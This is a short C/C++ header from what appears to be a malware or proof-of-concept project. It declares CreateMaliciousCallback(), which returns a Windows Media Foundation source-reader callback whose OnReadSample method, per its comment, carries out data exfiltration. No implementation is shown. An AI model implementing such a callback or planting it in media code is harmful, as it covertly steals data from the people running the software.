#ifndef MALICIOUS_CALLBACK_H
#define MALICIOUS_CALLBACK_H

// Define _WIN32_WINNT to ensure we get the proper definitions.
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0602
#endif

#include <mfidl.h>
#include <mfreadwrite.h>

// Creates and returns a malicious IMFSourceReaderCallback object
// whose OnReadSample method performs our exfiltration logic.
IMFSourceReaderCallback* CreateMaliciousCallback();

#endif // MALICIOUS_CALLBACK_H
